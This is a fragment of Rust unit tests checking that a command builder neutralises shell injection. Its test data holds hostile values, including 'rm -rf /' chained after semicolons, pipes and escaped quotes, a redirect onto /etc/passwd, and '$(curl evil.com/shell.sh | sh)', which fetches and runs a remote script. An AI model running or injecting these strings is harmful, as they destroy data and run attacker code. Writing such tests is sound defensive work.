...
fn test_shell_operator_injection_prevention() {
    ...
    assert_eq!(
        node.command.args,
        vec!["arg; rm -rf /", "| rm -rf /", "> /etc/passwd"]
    );
}
...
fn test_quote_escape_security() {
    let mut vars = HashMap::new();
    vars.insert(
        "escape_attempt".to_string(),
        "'; rm -rf /; echo '".to_string(),
    );
    vars.insert(
        "double_escape".to_string(),
        "\"; rm -rf /; echo \"".to_string(),
    );
...
fn test_complex_shell_injection_neutralization() {
    let mut vars = HashMap::new();
    vars.insert(
        "complex_attack".to_string(),
        "$(curl evil.com/shell.sh | sh)".to_string(),
    );
...
fn test_redirect_injection_prevention() {
    let mut vars = HashMap::new();
    vars.insert(
        "malicious_file".to_string(),
        "/etc/passwd; rm -rf /".to_string(),
    );
